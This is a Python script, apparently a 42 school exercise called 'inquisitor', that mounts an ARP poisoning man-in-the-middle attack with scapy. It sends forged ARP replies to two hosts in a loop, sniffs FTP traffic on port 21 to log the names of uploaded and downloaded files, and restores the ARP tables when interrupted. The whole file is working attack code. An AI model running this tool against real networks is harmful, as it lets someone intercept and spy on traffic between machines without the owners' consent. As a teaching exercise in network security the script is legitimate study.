# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    inquisitor.py                                      :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: hubourge <hubourge@student.42angouleme.    +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2025/06/23 15:42:16 by hubourge          #+#    #+#              #
#    Updated: 2025/06/25 17:00:52 by hubourge         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import socket
import sys
import time
import signal
import threading
import netifaces
from scapy.all import sniff, IP, TCP, Raw, ARP, Ether, sendp

poisoning = True
interface = None
count = 0

def getInterface(target_ip=None):
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            for addr in addrs[netifaces.AF_INET]:
                ip = addr.get('addr')
                if target_ip:
                    if ip == target_ip:
                        return iface
                elif ip != "127.0.0.1":
                    return iface
    return None

def parsing():
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <ip_src> <mac_src> <ip_target> <mac_target>")
        sys.exit(1)

    return sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]

def send_arp_reply(src_mac, src_ip, dest_mac, dest_ip):
    arp_reply = ARP(op=2, hwsrc=src_mac, psrc=src_ip, hwdst=dest_mac, pdst=dest_ip)
    ether = Ether(dst=dest_mac, src=src_mac)
    packet = ether / arp_reply
    sendp(packet, iface=interface, verbose=False)

def restore_arp(src_mac, src_ip, dest_mac, dest_ip):
    send_arp_reply(src_mac, src_ip, dest_mac, dest_ip)
    time.sleep(1)
    send_arp_reply(dest_mac, dest_ip, src_mac, src_ip)

def handle_sigint(sig, frame):
    global poisoning
    poisoning = False
    print(f"\n\n  Restore ARP table at {ip_target}")
    restore_arp(mac_src, ip_src, mac_target, ip_target)
    print(f"  Restore ARP table at {ip_src}")
    restore_arp(mac_target, ip_target, mac_src, ip_src)
    sys.exit(0)

def ftp_packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load.decode(errors="ignore")
        if payload.startswith("STOR") or payload.startswith("RETR"):
            filename = payload.strip().split(" ")[1]
            
            if payload.startswith("STOR"):
                direction = "Upload (STOR)"
            else:
                direction = "Download (RETR)"

            tmp_ip_src = packet[IP].src
            tmp_ip_dst = packet[IP].dst
            tmp_port_src = packet[TCP].sport
            tmp_port_dst = packet[TCP].dport

            print(f"\n  [FTP] {direction} -> {filename}")
            print(f"        From {tmp_ip_src}:{tmp_port_src} To {tmp_ip_dst}:{tmp_port_dst}")

def sniff_ftp_traffic():
    print("\n  Sniffing FTP traffic...")
    sniff(filter="tcp port 21", prn=ftp_packet_callback, store=0, iface=interface)

def resolve_hostname(hostname_or_ip):
    try:
        # Try reverse DNS lookup first
        hostname = socket.gethostbyaddr(hostname_or_ip)[0]
        return hostname
    except (socket.gaierror, socket.herror):
        try:
            # Fallback to getfqdn
            return socket.getfqdn(hostname_or_ip)
        except:
            return hostname_or_ip

def arp_request_callback(packet):
    if packet.haslayer(ARP) and packet[ARP].op == 1:  # ARP Request
        src_ip = packet[ARP].psrc
        target_ip = packet[ARP].pdst
        src_hostname = resolve_hostname(src_ip)
        target_hostname = resolve_hostname(target_ip)
        packet_length = len(packet[ARP])
        
        print(f"  ARP, Request who-has {target_hostname} tell {src_hostname}, length {packet_length}")
        
        if target_ip == ip_target:
            print(f"\n  Target found! Request who-has {target_hostname} tell {src_hostname}")
            return True
    return False

def wait_for_arp_request():
    print("\n  Listening for ARP Request...")
    
    sniff(filter="arp", stop_filter=arp_request_callback, store=0, iface=interface, timeout=30)

def arpPoisoning(ip_src, mac_src, ip_target, mac_target):
    global count
    
    wait_for_arp_request()
    
    print("\n  Starting ARP poisoning...")
    while poisoning:
        print(f"\r  [ARP REPLY] {count} - {ip_src_str} : {ip_target_str} is-at {mac_target} | {ip_target_str} : {ip_src_str} is-at {mac_src}", end='', flush=True)
        
        # Send poisoned ARP replies
        send_arp_reply(mac_target, ip_target, mac_src, ip_src)
        send_arp_reply(mac_src, ip_src, mac_target, ip_target)
        
        count += 1
        time.sleep(0.2)

def main():
    global ip_src, mac_src, ip_target, mac_target, ip_src_str, ip_target_str, interface, poisoning
    ip_src, mac_src, ip_target, mac_target = parsing()
    ip_src_str = resolve_hostname(ip_src)
    ip_target_str = resolve_hostname(ip_target)

    interface = getInterface(ip_src) or getInterface(ip_target) or "eth0"
    if not interface:
        print("No network interface found.")
        sys.exit(1)
    print(f"  Using interface: {interface}")

    signal.signal(signal.SIGINT, handle_sigint)

    print(f"\n  ARP Poisoning Attack")
    print(f"     Source IP:  {ip_src} ({ip_src_str})")
    print(f"     Source MAC: {mac_src}")
    print(f"     Target IP:  {ip_target} ({ip_target_str})")
    print(f"     Target MAC: {mac_target}")

    ftp_thread = threading.Thread(target=sniff_ftp_traffic, daemon=True)
    ftp_thread.start()
    time.sleep(2)

    arpPoisoning(ip_src, mac_src, ip_target, mac_target)

if __name__ == "__main__":
    main()
